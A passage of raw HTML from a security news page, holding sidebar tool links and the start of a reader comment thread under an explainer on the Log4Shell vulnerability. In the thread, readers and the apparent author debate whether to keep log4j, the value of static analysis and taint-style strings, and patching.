					<path d="M8.07 18.762a1.855 1.855 0 0 0 0 2.473c2.833 3.137 7.438 6.334 11.982 6.264 4.54.076 9.14-3.127 11.98-6.264a1.853 1.853 0 0 0 0-2.473c-2.9-3.204-7.515-6.334-11.977-6.26-4.468-.075-9.085 3.056-11.985 6.26ZM24.167 20a4.167 4.167 0 1 1-8.334 0 4.167 4.167 0 0 1 8.334 0ZM20 7.5a1.667 1.667 0 0 0 1.667-1.667v-2.5a1.667 1.667 0 0 0-3.334 0v2.5A1.667 1.667 0 0 0 20 7.5ZM20 32.5a1.667 1.667 0 0 0-1.667 1.667v2.5a1.667 1.667 0 0 0 3.334 0v-2.5A1.667 1.667 0 0 0 20 32.5ZM38.333 18.333h-2.5a1.666 1.666 0 1 0 0 3.334h2.5a1.667 1.667 0 0 0 0-3.334ZM1.667 21.667h2.5a1.667 1.667 0 1 0 0-3.334h-2.5a1.666 1.666 0 1 0 0 3.334Z" fill="#000"/>
				</svg>
			</figure>
			<h4 class="ns-free-tools__title">
				Sophos Scan &amp; Clean			</h4>
			<div class="ns-free-tools__sub-title">
				Free second-opinion scanner for PCs.			</div>
		</a>
	</div>
	<div class="ns-free-tools__item ns-free-tools__item--intercept-x">
		<a class="ns-free-tools__link" href="https://aws.amazon.com/marketplace/pp/prodview-7silxvfxce4zq?qid=1599237395672&sr=0-1&ref_=srh_res_product_title">
			<figure class="ns-free-tools__image">
				<svg width="40" height="40" fill="none" xmlns="http://www.w3.org/2000/svg">
					<path d="M3.241 24.179a1.698 1.698 0 0 0 2.362-.57 1.68 1.68 0 0 0 .234-.859 1.564 1.564 0 0 0-.758-1.342 3.706 3.706 0 0 1-.676-.52 3.932 3.932 0 0 1-1.065-2.96A4.28 4.28 0 0 1 4.6 14.894a4.321 4.321 0 0 1 3.938-1.165 1.674 1.674 0 0 0 1.831-.898c.108-.22.165-.46.169-.703.14-9.544 13.83-12.215 18.03-3.393a1.618 1.618 0 0 0 1.569.948 6.19 6.19 0 0 1 4.985 2.146 6.398 6.398 0 0 1 1.527 4.607 5.684 5.684 0 0 1-1.965 4.121 1.581 1.581 0 0 0-.52 1.198 1.641 1.641 0 0 0 .939 1.495 1.66 1.66 0 0 0 1.759-.206 8.952 8.952 0 0 0 2.327-3.084 8.914 8.914 0 0 0 .807-3.773 9.536 9.536 0 0 0-2.407-6.604 9.617 9.617 0 0 0-6.29-3.184.418.418 0 0 1-.317-.199 12.786 12.786 0 0 0-5.593-5.014 12.856 12.856 0 0 0-7.456-1.02 12.827 12.827 0 0 0-6.744 3.326 12.735 12.735 0 0 0-3.702 6.524.416.416 0 0 1-.378.332 7.758 7.758 0 0 0-3.491 1.122 7.717 7.717 0 0 0-2.58 2.597 7.405 7.405 0 0 0-1.033 4.06 7.084 7.084 0 0 0 2.058 5.126c.358.35.753.66 1.178.926Z" fill="#000"/>
					<path d="m17.818 39.424.921.35a3.44 3.44 0 0 0 2.451 0l.922-.35c5.134-1.947 8.72-6.587 8.72-11.28v-5.636a2.556 2.556 0 0 0-1.547-2.35 27.468 27.468 0 0 0-9.32-1.725c-3.162.026-6.293.61-9.249 1.726-.46.199-.85.527-1.125.945a2.555 2.555 0 0 0-.421 1.404v5.624a12.765 12.765 0 0 0 2.607 6.95 12.852 12.852 0 0 0 6.041 4.342Zm-2.816-10.629c-.332 0-.65-.13-.884-.364a1.242 1.242 0 0 1 .884-2.124h3.332a.418.418 0 0 0 .417-.415v-3.318c0-.33.132-.646.366-.88a1.253 1.253 0 0 1 1.767 0c.235.234.366.55.366.88v3.318a.414.414 0 0 0 .417.415H25c.331 0 .649.13.883.364A1.241 1.241 0 0 1 25 28.795h-3.333a.417.417 0 0 0-.417.415v3.318c0 .33-.131.646-.366.88a1.253 1.253 0 0 1-1.767 0 1.241 1.241 0 0 1-.366-.88V29.21a.414.414 0 0 0-.417-.415h-3.332Z" fill="#000"/>
				</svg>
			</figure>
			<h4 class="ns-free-tools__title">
				Sophos Cloud Optix			</h4>
			<div class="ns-free-tools__sub-title">
				Monitor 25 cloud assets for free.			</div>
		</a>
	</div>
</div>
		</div>

			<nav class="navigation post-navigation" role="navigation">
		<h2 class="screen-reader-text">Post navigation</h2>

		<div class="nav-links">
			<div class="nav-previous"><a href="https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/" rel="prev"><span class="nav-label">Previous</span><span class="nav-seperator">:</span><span class="nav-title"> &#8220;Log4Shell&#8221; Java vulnerability &#8211; how to safeguard your servers</span></a></div><div class="nav-next"><a href="https://nakedsecurity.sophos.com/2021/12/14/apple-security-updates-are-out-and-not-a-log4shell-mention-in-sight/" rel="next"><span class="nav-label">Next</span><span class="nav-seperator">:</span><span class="nav-title"> Apple security updates are out &#8211; and not a Log4Shell mention in sight</span></a></div>		</div>
		<!-- .nav-links -->
	</nav><!-- .navigation -->
	
	
	</main><!-- #main -->

	</div> <!-- .panel-container -->
	</div> <!-- .container -->
	</section> <!-- .panel -->

	
	
	<section class="comments-panel">
	<div class="container">
	<div class="panel-content framed-content-area">

			
<div id="comments" class="comments-area">

			<h2 class="comments-title">
			34 comments on &ldquo;<span>Log4Shell explained &#8211; how it works, why you need to know, and how to fix it</span>&rdquo;		</h2>

		<ol class="comment-list">
					<li id="comment-6369942" class="comment even thread-even depth-1 parent">
			<article id="div-comment-6369942" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/50556260b230849a933a9826f125f737?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/50556260b230849a933a9826f125f737?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Sitwon</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6369942"><time datetime="2021-12-13T03:22:46+00:00">December 13, 2021 at 3:22 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Dropping log4j entirely would be throwing out the baby with the bathwater. You still need a logging system in place for compliance, security, and development. Log4j is the most mature logging system for the Java ecosystem, and serves as the model/inspiration for the dominant logging systems of most other languages as well. We can&#8217;t throw away log4j just as we didn&#8217;t throw away printf().</p>
<p>Suggesting that we abandon a core library like log4j is just as brain dead as suggesting that an organization casually rewrite their entire codebase in a different programming language.</p>
<p>Java can be statically analyzed, and we can fail builds in the CI pipeline for passing unsanitized input to logging methods.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6369942"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6369942={"id":7238218,"unique_id":"wp-comment-6369942","title":"Dropping%20log4j%20entirely%20would%20be%20throwing%20out%20the%20baby%20with%20the%20bathwater.%20You%20still%20need%20a%20logging%20system%20in%20place%20for%20compliance%2C%20security%2C%20and%20development.%20Log4j%20is%20the%20most%20mature%20logging%20sys%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6369942","item_id":"_comm_6369942"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6369942#respond' data-commentid="6369942" data-postid="647469" data-belowelement="div-comment-6369942" data-respondelement="respond" data-replyto="Reply to Sitwon" aria-label='Reply to Sitwon'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370027" class="comment byuser comment-author-pducklin bypostauthor odd alt depth-2 parent">
			<article id="div-comment-6370027" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370027"><time datetime="2021-12-13T10:10:10+00:00">December 13, 2021 at 10:10 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Static analysis won&#8217;t help you here&#8230; this was not a bug, it was a feature. And the fact that something is &#8220;mature&#8221;, which often means little more than &#8220;old and entrenched, but don&#8217;t panic because everyone else is using it&#8221;, tells you nothing about its cybersecurity qualities. </p>
<p>When the Persians said, &#8220;This too shall pass,&#8221; they weren&#8217;t talking about passing CI tests :&#045;)</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370027"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370027={"id":7238218,"unique_id":"wp-comment-6370027","title":"Static%20analysis%20won%26%23039%3Bt%20help%20you%20here...%20this%20was%20not%20a%20bug%2C%20it%20was%20a%20feature.%20And%20the%20fact%20that%20something%20is%20%26quot%3Bmature%26quot%3B%2C%20which%20often%20means%20little%20more%20than%20%26quot%3Bold%20and%20entrenched%2C%20but%20don%26%23039%3Bt%20panic%20becau%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370027","item_id":"_comm_6370027"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370027#respond' data-commentid="6370027" data-postid="647469" data-belowelement="div-comment-6370027" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370090" class="comment even depth-3">
			<article id="div-comment-6370090" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/6462cc65690c99dfbaf838bbaeeb6a56?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6462cc65690c99dfbaf838bbaeeb6a56?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">David Pottage</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370090"><time datetime="2021-12-13T14:40:28+00:00">December 13, 2021 at 2:40 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>IMHO, static analysis would help if we give it the hints it needs.</p>
<p>For example, rather than passing a plain old instance of the String class to the logger, we could pass an instance of UntrustedString, or TrustedString the the logger. (Both subclasses of java.lang.String &#8211; These a made up class names &#8211; I have no idea if they exist).</p>
<p>The logger can do as much expansion as it wants to on a trusted string, but none at all on an untrusted one. Any strings from outside get the untrusted tag and if a programmer constructs a trusted string from an untrusted one with validation and sanitization then it should get picked up in code review.</p>
<p>All this is similar to the taint flag that Perl has had for about 25 years! This is not a new programming paradigm, and should be part of sensible best practice everywhere these days.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370090"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370090={"id":7238218,"unique_id":"wp-comment-6370090","title":"IMHO%2C%20static%20analysis%20would%20help%20if%20we%20give%20it%20the%20hints%20it%20needs.For%20example%2C%20rather%20than%20passing%20a%20plain%20old%20instance%20of%20the%20String%20class%20to%20the%20logger%2C%20we%20could%20pass%20an%20instance%20of%20UntrustedSt%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370090","item_id":"_comm_6370090"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370090#respond' data-commentid="6370090" data-postid="647469" data-belowelement="div-comment-6370090" data-respondelement="respond" data-replyto="Reply to David Pottage" aria-label='Reply to David Pottage'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370109" class="comment odd alt depth-2 parent">
			<article id="div-comment-6370109" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/defa7cc8419ad22189d6476ccecbe240?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/defa7cc8419ad22189d6476ccecbe240?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Guillaume Coté</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370109"><time datetime="2021-12-13T15:54:22+00:00">December 13, 2021 at 3:54 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>You can replace lo4j by sfl4j.  Slf4j is way more mature that log4j.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370109"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370109={"id":7238218,"unique_id":"wp-comment-6370109","title":"You%20can%20replace%20lo4j%20by%20sfl4j.%20%20Slf4j%20is%20way%20more%20mature%20that%20log4j.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370109","item_id":"_comm_6370109"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370109#respond' data-commentid="6370109" data-postid="647469" data-belowelement="div-comment-6370109" data-respondelement="respond" data-replyto="Reply to Guillaume Coté" aria-label='Reply to Guillaume Coté'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370165" class="comment even depth-3">
			<article id="div-comment-6370165" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Anonymous</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370165"><time datetime="2021-12-13T19:59:47+00:00">December 13, 2021 at 7:59 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Slf4j is only  facade, you still need an implementation (i.e. Log4j, Logback)</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370165"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370165={"id":7238218,"unique_id":"wp-comment-6370165","title":"Slf4j%20is%20only%20%20facade%2C%20you%20still%20need%20an%20implementation%20%28i.e.%20Log4j%2C%20Logback%29%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370165","item_id":"_comm_6370165"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370165#respond' data-commentid="6370165" data-postid="647469" data-belowelement="div-comment-6370165" data-respondelement="respond" data-replyto="Reply to " aria-label='Reply to '>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370253" class="comment odd alt depth-2 parent">
			<article id="div-comment-6370253" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Aidan</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370253"><time datetime="2021-12-14T02:00:16+00:00">December 14, 2021 at 2:00 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>I&#8217;d like to better understand the downvotes here.  Vulnerabilities are discovered and patched on a daily basis &#8211; why would people advocate not using a given library just because there&#8217;s been a vulnerability discovered?  Wouldn&#8217;t the fastest/easiest option be to patch and move on?  (Full disclosure: I&#8217;m neither a dev nor a security expert &#8211; just trying to understand).</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370253"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370253={"id":7238218,"unique_id":"wp-comment-6370253","title":"I%26%23039%3Bd%20like%20to%20better%20understand%20the%20downvotes%20here.%20%20Vulnerabilities%20are%20discovered%20and%20patched%20on%20a%20daily%20basis%20-%20why%20would%20people%20advocate%20not%20using%20a%20given%20library%20just%20because%20there%26%23039%3Bs%20been%20a%20vu%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370253","item_id":"_comm_6370253"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370253#respond' data-commentid="6370253" data-postid="647469" data-belowelement="div-comment-6370253" data-respondelement="respond" data-replyto="Reply to Aidan" aria-label='Reply to Aidan'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370259" class="comment byuser comment-author-pducklin bypostauthor even depth-3">
			<article id="div-comment-6370259" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370259"><time datetime="2021-12-14T02:30:45+00:00">December 14, 2021 at 2:30 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Patching is important. But I think it&#8217;s perfectly reasonable, in the aftermath of this, to consider if logging code that is quite this extensible/powerful/OTT is really what you need, or whether you just decided to use it because everyone else did. (Note that I didn&#8217;t say you *should* throw out Log4j, just that you might *consider* switching over, givem that this &#8220;bug&#8221; was really a feature &#8211; the part that you exploit wasn&#8217;t there by mistake, but by design, and the patch basically turns it off by default rather than on.)</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370259"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370259={"id":7238218,"unique_id":"wp-comment-6370259","title":"Patching%20is%20important.%20But%20I%20think%20it%26%23039%3Bs%20perfectly%20reasonable%2C%20in%20the%20aftermath%20of%20this%2C%20to%20consider%20if%20logging%20code%20that%20is%20quite%20this%20extensible%2Fpowerful%2FOTT%20is%20really%20what%20you%20need%2C%20or%20whether%20%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370259","item_id":"_comm_6370259"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370259#respond' data-commentid="6370259" data-postid="647469" data-belowelement="div-comment-6370259" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6369953" class="comment odd alt thread-odd thread-alt depth-1">
			<article id="div-comment-6369953" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Andrew Cheong</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6369953"><time datetime="2021-12-13T03:52:29+00:00">December 13, 2021 at 3:52 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Great explanation, thanks.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6369953"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6369953={"id":7238218,"unique_id":"wp-comment-6369953","title":"Great%20explanation%2C%20thanks.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6369953","item_id":"_comm_6369953"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6369953#respond' data-commentid="6369953" data-postid="647469" data-belowelement="div-comment-6369953" data-respondelement="respond" data-replyto="Reply to Andrew Cheong" aria-label='Reply to Andrew Cheong'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		<li id="comment-6370018" class="comment even thread-even depth-1 parent">
			<article id="div-comment-6370018" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/367c6c68528b9f56dc5e9832f2ba2c41?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/367c6c68528b9f56dc5e9832f2ba2c41?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">JS</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370018"><time datetime="2021-12-13T09:26:02+00:00">December 13, 2021 at 9:26 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Thanks for the clear write-up!<br />
Btw, there&#8217;s a error with the link apache-log4j-2.15.0-bin.zip<br />
Likely a typo when you changed the filename but didn&#8217;t change the rest of the path. Cheers.<br />
-JS @breaktoprotect</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370018"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370018={"id":7238218,"unique_id":"wp-comment-6370018","title":"Thanks%20for%20the%20clear%20write-up%21%20Btw%2C%20there%26%23039%3Bs%20a%20error%20with%20the%20link%20apache-log4j-2.15.0-bin.zipLikely%20a%20typo%20when%20you%20changed%20the%20filename%20but%20didn%26%23039%3Bt%20change%20the%20rest%20of%20the%20path.%20Cheers.-JS%20%40breakt%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370018","item_id":"_comm_6370018"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370018#respond' data-commentid="6370018" data-postid="647469" data-belowelement="div-comment-6370018" data-respondelement="respond" data-replyto="Reply to JS" aria-label='Reply to JS'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370024" class="comment byuser comment-author-pducklin bypostauthor odd alt depth-2">
			<article id="div-comment-6370024" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370024"><time datetime="2021-12-13T09:54:28+00:00">December 13, 2021 at 9:54 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Fixed, thanks.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370024"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370024={"id":7238218,"unique_id":"wp-comment-6370024","title":"Fixed%2C%20thanks.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370024","item_id":"_comm_6370024"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370024#respond' data-commentid="6370024" data-postid="647469" data-belowelement="div-comment-6370024" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370088" class="comment even thread-odd thread-alt depth-1">
			<article id="div-comment-6370088" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Bill Long</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
